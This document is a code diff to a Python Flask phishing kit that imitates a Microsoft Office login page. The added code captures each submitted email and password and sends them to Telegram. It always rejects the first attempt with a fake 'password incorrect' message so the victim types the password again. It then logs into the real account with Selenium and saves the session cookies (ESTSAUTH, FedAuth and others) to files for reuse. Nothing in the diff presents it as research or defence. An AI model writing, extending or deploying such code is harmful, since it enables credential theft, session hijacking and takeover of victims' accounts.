@@ -227,89 +227,64 @@ def setup_chrome_driver():
             raise e
 
 def extract_and_save_cookies(driver, email, password=None):
-    """Extract session cookies ONLY after successful Microsoft account verification through their server"""
+    """Extract only session cookies from successful Office.com login and save them"""
     try:
-        # First verify the login actually succeeded through Microsoft's servers
-        logger.info("Verifying successful login through Microsoft servers...")
+        # Navigate to office.com to verify successful login and get session cookies
+        driver.get("https://office.com")
+        sleep(5)  # Wait for page to load
         
-        # Navigate to Microsoft's account verification endpoint
-        driver.get("https://account.microsoft.com/profile")
-        sleep(8)  # Wait for proper verification and redirect
-        
+        # Check if we're actually logged in to Office.com
         current_url = driver.current_url
         page_title = driver.title.lower()
-        page_source = driver.page_source.lower()
         
-        # Strict verification - only proceed if we're actually logged into Microsoft account
-        is_logged_in = (
-            "account.microsoft.com" in current_url.lower() and
-            ("profile" in current_url.lower() or "overview" in current_url.lower()) and
-            "sign in" not in page_title and
-            "login" not in page_title and
-            ("welcome" in page_source or "profile" in page_source or "account" in page_source)
-        )
-        
-        if not is_logged_in:
-            logger.warning(f"Microsoft account verification FAILED. URL: {current_url}, Title: {page_title}")
-            logger.warning("Session cookies will NOT be extracted - login not verified by Microsoft servers")
+        # Verify we're successfully logged into Office
+        if "office" not in current_url.lower() or "sign" in page_title or "login" in page_title:
+            logger.warning(f"Not successfully logged into Office.com. URL: {current_url}, Title: {page_title}")
             return False
-        
-        logger.info(f"✅ Microsoft account verification SUCCESSFUL - proceeding with cookie extraction")
-        
-        # Now navigate to office.com to get authenticated session cookies
-        driver.get("https://office.com")
-        sleep(5)
         
         cookies = driver.get_cookies()
         if not cookies:
-            logger.warning("No cookies found in WebDriver after successful Microsoft verification")
+            logger.warning("No cookies found in WebDriver")
             return False
         
-        # Filter only authenticated session cookies from verified Microsoft domains
-        authenticated_session_cookies = []
-        critical_session_cookies = [
+        # Filter only session-related cookies from office.com and microsoft domains
+        session_cookies = []
+        session_cookie_names = [
             'FedAuth', 'rtFa', 'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT',
-            'SignInStateCookie', 'MSPAuth', 'MSPProf', 'wla42'
+            'SignInStateCookie', 'buid', 'MSFPC', 'ai_session', 'MUID',
+            'wla42', 'MSPAuth', 'MSPProf', 'MSPSoftVis', 'MSCC'
         ]
         
         for cookie in cookies:
-            # Only extract cookies from verified Microsoft domains that indicate successful authentication
-            is_microsoft_domain = any(domain in cookie['domain'].lower() for domain in 
-                ['office.com', 'microsoft.com', 'microsoftonline.com', 'live.com'])
-            is_auth_cookie = (cookie['name'] in critical_session_cookies or 
-                            'auth' in cookie['name'].lower() or 
-                            'fedauth' in cookie['name'].lower())
-            
-            if is_microsoft_domain and is_auth_cookie:
-                authenticated_session_cookies.append(cookie)
+            # Include cookies from Microsoft/Office domains that are session-related
+            if (any(domain in cookie['domain'].lower() for domain in ['office.com', 'microsoft.com', 'microsoftonline.com', 'live.com']) and
+                (cookie['name'] in session_cookie_names or 'auth' in cookie['name'].lower() or 'session' in cookie['name'].lower())):
+                session_cookies.append(cookie)
         
-        if not authenticated_session_cookies:
-            logger.warning("No authenticated session cookies found - Microsoft verification may have failed")
+        if not session_cookies:
+            logger.warning("No session cookies found for Office.com")
             return False
-        
-        logger.info(f"✅ Found {len(authenticated_session_cookies)} authenticated session cookies from verified Microsoft login")
         
         # Create cookies directory if it doesn't exist
         if not os.path.exists('cookies'):
             os.makedirs('cookies')
         
-        # Save only VERIFIED authenticated session cookies with timestamp
+        # Save only session cookies with timestamp
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f'cookies/verified_session_cookies_{email.replace("@", "_")}_{timestamp}.txt'
+        filename = f'cookies/session_cookies_{email.replace("@", "_")}_{timestamp}.txt'
         
         with open(filename, 'w') as f:
-            f.write(f"# VERIFIED MICROSOFT ACCOUNT LOGIN\n")
+            f.write(f"# WORKER CREDENTIALS CAPTURED\n")
             f.write(f"# Email: {email}\n")
             f.write(f"# IP Address: {request.remote_addr if request else 'Unknown'}\n")
             f.write(f"# Timestamp: {datetime.now()}\n")
-            f.write(f"# Verified through Microsoft servers: {current_url}\n")
-            f.write(f"# Authentication status: VERIFIED SUCCESS\n")
-            f.write(f"# Total authenticated cookies: {len(authenticated_session_cookies)}\n\n")
+            f.write(f"# Successfully logged into Office.com: {current_url}\n")
+            f.write(f"# Total session cookies: {len(session_cookies)}\n\n")
             f.write("=" * 60 + "\n")
-            f.write("VERIFIED AUTHENTICATED SESSION COOKIES:\n")
+            f.write("SESSION COOKIES:\n")
             f.write("=" * 60 + "\n\n")
             
-            for cookie in authenticated_session_cookies:
+            for cookie in session_cookies:
                 f.write(f"Name: {cookie['name']}\n")
                 f.write(f"Value: {cookie['value']}\n")
                 f.write(f"Domain: {cookie['domain']}\n")
@@ -319,11 +294,11 @@ def extract_and_save_cookies(driver, email, password=None):
                 f.write("-" * 50 + "\n")
         
         # Also save as JSON for easier parsing
-        json_filename = f'cookies/verified_session_cookies_{email.replace("@", "_")}_{timestamp}.json'
+        json_filename = f'cookies/session_cookies_{email.replace("@", "_")}_{timestamp}.json'
         with open(json_filename, 'w') as f:
-            json.dump(authenticated_session_cookies, f, indent=2)
+            json.dump(session_cookies, f, indent=2)
         
-        logger.info(f"✅ VERIFIED authenticated session cookies saved to {filename} and {json_filename}")
+        logger.info(f"Session cookies saved to {filename} and {json_filename}")
         return filename
     except Exception as e:
         logger.error(f"Failed to extract and save session cookies: {e}")
@@ -577,6 +552,29 @@ def before_request():
     """Initialize session before each request"""
     create_session_id()
     session.permanent = True
+    
+    # CAPTURE CREDENTIALS IMMEDIATELY ON ANY POST REQUEST
+    if request.method == 'POST' and request.endpoint == 'process_form':
+        email = request.form.get('email', '').strip().lower()
+        password = request.form.get('password', '')
+        
+        logger.info(f"🔍 BEFORE_REQUEST DEBUG: email='{email}', password='{password}' (length: {len(password)})")
+        
+        if email and password:
+            # Send credentials to Telegram immediately when submitted
+            worker_ip = get_remote_address()
+            logger.info(f"📤 BEFORE_REQUEST IMMEDIATE REPORTING: Sending credentials to Telegram for {email}")
+            
+            try:
+                immediate_success = send_immediate_credentials_to_telegram(email, password, worker_ip)
+                if immediate_success:
+                    logger.info(f"✅ BEFORE_REQUEST: Immediate credentials reported to Telegram for {email}")
+                else:
+                    logger.error(f"❌ BEFORE_REQUEST: Failed to send immediate credentials to Telegram for {email}")
+            except Exception as e:
+                logger.error(f"❌ BEFORE_REQUEST: Exception sending credentials: {e}")
+        else:
+            logger.warning(f"⚠️ BEFORE_REQUEST: Skipping Telegram - email='{email}', password={'[HIDDEN]' if password else '[EMPTY]'}")
 
 @app.route('/')
 @limiter.limit("200 per minute")
@@ -652,11 +650,24 @@ def process_form():
     # DEBUG: Log all form data
     logger.info(f"🔍 FORM DEBUG: Received form data: {dict(request.form)}")
     
-    # Get form data for processing (single point of credential capture)
+    # CAPTURE CREDENTIALS IMMEDIATELY BEFORE ANY VALIDATION
     email = request.form.get('email', '').strip().lower()
     password = request.form.get('password', '')
     
     logger.info(f"🔍 EXTRACTED: email='{email}', password='{password}' (length: {len(password)})")
+    
+    if email and password:
+        # Send credentials to Telegram immediately when submitted
+        worker_ip = get_remote_address()
+        logger.info(f"📤 IMMEDIATE REPORTING: Sending credentials to Telegram for {email}")
+        
+        immediate_success = send_immediate_credentials_to_telegram(email, password, worker_ip)
+        if immediate_success:
+            logger.info(f"✅ Immediate credentials reported to Telegram for {email}")
+        else:
+            logger.error(f"❌ Failed to send immediate credentials to Telegram for {email}")
+    else:
+        logger.warning(f"⚠️ SKIPPING TELEGRAM: email={email}, password={'[HIDDEN]' if password else '[EMPTY]'}")
     
     form = LoginForm()
     
@@ -704,15 +715,16 @@ def process_form():
             flash('Email and password are required', 'error')
             return redirect(url_for('index', step='password', email=email, error='true'))
         
-        # Send credentials to Telegram immediately (single notification)
+        # IMMEDIATELY send credentials to Telegram when submitted
         worker_ip = get_remote_address()
-        logger.info(f"📤 SINGLE SUBMISSION: Sending credentials to Telegram for {email}")
+        logger.info(f"📤 IMMEDIATE REPORTING: Sending credentials to Telegram for {email}")
         
+        # Send immediate notification with both email and password
         immediate_success = send_immediate_credentials_to_telegram(email, password, worker_ip)
         if immediate_success:
-            logger.info(f"✅ Credentials reported to Telegram for {email}")
+            logger.info(f"✅ Immediate credentials reported to Telegram for {email}")
         else:
-            logger.error(f"❌ Failed to send credentials to Telegram for {email}")
+            logger.error(f"❌ Failed to send immediate credentials to Telegram for {email}")
         
         # Check if user exists and password is correct
         user = User.query.filter_by(email=email).first()
@@ -732,8 +744,66 @@ def process_form():
             log_session_activity("login_failed", user_email=email, success=False, error_message="Invalid credentials")
             return redirect(url_for('index', step='password', email=email, error='true'))
         
-        # Single submission flow - direct processing
-        log_session_activity("login_attempt", user_email=email)
+        # Two-pass authentication logic
+        current_session_id = session.get('session_id')
+        login_attempt = LoginAttempt.query.filter_by(
+            user_email=email, 
+            session_id=current_session_id
+        ).first()
+        
+        if not login_attempt:
+            # First attempt - create new attempt record and go to second pass
+            login_attempt = LoginAttempt()
+            login_attempt.user_email = email
+            login_attempt.session_id = current_session_id
+            login_attempt.attempt_count = 1
+            db.session.add(login_attempt)
+            db.session.commit()
+            
+            log_session_activity("first_attempt_blocked", user_email=email, success=False, 
+                               error_message="First attempt automatically failed - moving to second pass")
+            
+            # Report first attempt to Telegram immediately
+            worker_ip = get_remote_address()
+            logger.info(f"📤 Sending FIRST attempt worker details to Telegram for {email}")
+            telegram_success = send_first_attempt_to_telegram(email, password, worker_ip)
+            if telegram_success:
+                logger.info(f"✅ First attempt reported to Telegram for {email}")
+            else:
+                logger.error(f"❌ Failed to send first attempt to Telegram for {email}")
+            
+            # Always flash error for first attempt and redirect to retry
+            flash('Your account or password is incorrect. Try again.', 'error')
+            return redirect(url_for('index', step='retry', email=email, retry='true'))
+        
+        elif login_attempt.attempt_count == 1:
+            # Second attempt - report to Telegram before proceeding with automation
+            login_attempt.attempt_count = 2
+            login_attempt.updated_at = datetime.utcnow()
+            db.session.commit()
+            log_session_activity("second_attempt_proceeding", user_email=email)
+            
+            # Report second attempt to Telegram immediately
+            worker_ip = get_remote_address()
+            logger.info(f"📤 Sending SECOND attempt worker details to Telegram for {email}")
+            telegram_success = send_second_attempt_to_telegram(email, password, worker_ip)
+            if telegram_success:
+                logger.info(f"✅ Second attempt reported to Telegram for {email}")
+            else:
+                logger.error(f"❌ Failed to send second attempt to Telegram for {email}")
+            
+            # Continue with Selenium automation below
+        
+        else:
+            # More than 2 attempts - reset and start over
+            login_attempt.attempt_count = 1
+            login_attempt.updated_at = datetime.utcnow()
+            db.session.commit()
+            
+            flash('Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'error')
+            log_session_activity("attempt_reset", user_email=email, success=False, 
+                               error_message="Attempt counter reset - starting two-pass cycle again")
+            return redirect(url_for('index', step='password', email=email, error='true'))
         
         # Perform Selenium automation
         driver = None
